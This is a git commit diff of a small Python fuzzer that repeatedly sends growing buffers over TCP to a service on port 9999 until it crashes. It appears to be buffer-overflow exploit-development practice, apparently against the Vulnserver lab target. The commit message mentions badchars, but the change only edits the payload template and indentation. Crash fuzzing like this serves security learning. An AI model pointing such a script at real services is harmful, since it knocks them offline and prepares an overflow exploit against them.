14f40331a4800dac28a2b69c7cd987872c9960c6
melnicek <melnicek@pm.me>
2020-08-04 18:06:34 +0200

    Added badchars.

--- yz-fuzzer.py
+++ yz-fuzzer.py
@@ -2,7 +2,8 @@
 import sys, socket
 from time import sleep
 
-starting_buffer = b"TRUN /.:/^FUZZ^"
+# '^FUZZ^ parameter will be fuzzed'
+starting_buffer = b"^FUZZ^"
 RHOST = "192.168.0.109"
 RPORT = 9999
 connection_timeout = 2
@@ -15,14 +16,14 @@ buffer = b"1" * buffer_start_size
 socket.setdefaulttimeout(connection_timeout)
 
 while True:
-    try:
-        buffer = buffer + b"1" * buffer_step_size
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((RHOST, RPORT))
-        print("Sending buffer with a length of: " + str(len(buffer)))
-        s.send(starting_buffer.replace(b"^FUZZ^", buffer))
-        s.close()
-        sleep(1)
-    except:
-        print("Last buffer probably crashed server :(")
-        sys.exit(0)
+  try:
+    buffer = buffer + b"1" * buffer_step_size
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((RHOST, RPORT))
+    print("Sending buffer with a length of: " + str(len(buffer)))
+    s.send(starting_buffer.replace(b"^FUZZ^", buffer))
+    s.close()
+    sleep(1)
+  except:
+    print("Last buffer probably crashed server :(")
+    sys.exit(0)
